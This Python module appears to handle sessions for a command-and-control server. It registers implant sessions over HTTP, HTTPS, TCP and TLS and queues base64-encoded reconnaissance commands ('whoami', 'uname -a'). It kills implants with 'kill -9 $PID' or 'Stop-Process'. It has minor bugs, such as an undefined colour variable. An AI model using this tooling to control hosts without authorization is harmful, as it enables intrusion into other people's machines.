import queue
import base64
import fnmatch
import uuid
import threading
import signal
from typing import Dict

class Session:
    def __init__(self, sid, transport, handler):
        self.sid = sid
        self.transport = transport
        self.handler = handler
        self.merge_command_queue: Dict[str, queue.Queue] = {}
        self.merge_response_queue: Dict[str, queue.Queue] = {}
        self.lock = threading.Lock()
        self.recv_lock = threading.Lock()
        self.exec_lock = threading.Lock()
        self.command_queue = queue.Queue()
        self.output_queue = queue.Queue()
        self.meta_command_queue = queue.Queue(maxsize=1000)
        self.meta_output_queue = queue.Queue(maxsize=1000)
        self.metadata = {}
        self.metadata_stage = 0
        self.collection = 0
        self.mode = "detect_os"
        self.last_cmd_type = "meta"
        self.os_metadata_commands = []
        self.metadata_fields = []

        self.queue_metadata_commands()
    
    def queue_metadata_commands(self):
        cmd = "uname -a"
        self.meta_command_queue.put(base64.b64encode(cmd.encode()).decode())
    
    def detect_os(self, output):
        lower = output.lower()

        if "linux" in lower or "darwin" in lower:
            self.metadata["os"] = "Linux"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [("hostname", "hostname"), ("user", "whoami"), ("arch", "uname -m") ]
        else:
            self.metadata["os"] = "Windows"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [("hostname", "hostname"), ("user", "whoami"), ("arch", "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)") ]
            

class TimeoutException(Exception):
    test = "anyvalue"

def _timout_handler(signum, frame):
    raise TimeoutException("operation timed out!")

signal.signal(signal.SIGALRM, _timout_handler)

sessions = {}
alias_map = {}
dead_sessions = set()

def kill_http_session(sid, os_type, becon_interval=False):
    session = sessions[sid]
    if not session:
        return False
    
    if os_type.lower() == "windows":
        cmd = "Stop-Process -Id $PID -Force"
    else:
        cmd = "kill -9 $PID"
    
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    session.command_queue.put(b64_cmd)

    dead_sessions.add(sid)

    for alias, real in list(alias_map.items()):
        if real == sid:
            del alias_map[alias]
    
    sess = sessions.pop(sid, None)
    return True

def set_alias(alias, sid):
    alias_map[alias] = sid

def resolve_sid(raw: str) -> str|None:
    """Given a raw input (SID or alias), return the canonical SID, or None."""
    # exact alias match?
    if raw in alias_map:
        return alias_map[raw]

    # WILDCARD: if the user typed '*' or '?' in their SID, try glob match
    try:
        if any(ch in raw for ch in "*?"):
            # collect all real SIDs and their aliases
            # (we only need to match against sessions keys and alias_map keys)
            matches = [
                sid for sid in sessions
                if fnmatch.fnmatch(sid, raw)
            ]
            # also match against alias names, resolving to real SIDs
            matches += [
                alias_map[alias]
                for alias in alias_map
                if fnmatch.fnmatch(alias, raw)
            ]
            # de-duplicate while preserving order
            matches = list(dict.fromkeys(matches))

            if len(matches) == 1:
                return matches[0]

            elif len(matches) > 1:
                print(brightred + f"[!] Ambiguous session pattern '{raw}' → matches {matches!r}")

    except Exception as e:
        print(brightred + f"[!] Failed to resolve sid: {e}")
            

    # exact SID?
    if raw in sessions:
        return raw

    # no match
    return None

def register_http_session(sid):
    sessions[sid] = Session(sid, 'http', queue.Queue())

def register_https_session(sid):
    sessions[sid] = Session(sid, 'https', queue.Queue())

def register_tcp_session(sid, client_socket, is_ssl):
    if is_ssl:
        sessions[sid] = Session(sid, 'tls', client_socket)

    elif not is_ssl:
        sessions[sid] = Session(sid, 'tcp', client_socket)

    else:
        pass

def is_http_session(sid):
    return sessions[sid].transport == 'http'

def is_tcp_session(sid):
    transport = sessions[sid].transport

    if transport == 'tcp':
        return sessions[sid].transport == 'tcp'

    elif transport == 'tls':
        return sessions[sid].transport == 'tls'

    else:
        return False
